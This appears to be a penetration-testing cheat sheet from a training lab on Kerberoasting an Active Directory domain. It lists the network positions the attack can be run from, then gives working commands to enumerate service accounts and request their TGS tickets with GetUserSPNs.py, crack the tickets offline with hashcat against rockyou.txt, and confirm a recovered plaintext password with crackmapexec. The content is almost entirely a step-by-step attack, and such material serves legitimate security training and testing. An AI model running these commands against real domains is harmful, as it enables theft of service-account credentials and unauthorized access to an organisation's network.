
#### Possible Cases

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Listing SPN Accounts
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Request All TGS Tickets (-outputfile sqldev_tgs)
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

Request TGS Ticket For A Specific User (-outputfile sqldev_tgs)
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Cracking TGS Tickets
```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Auth Testing
```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
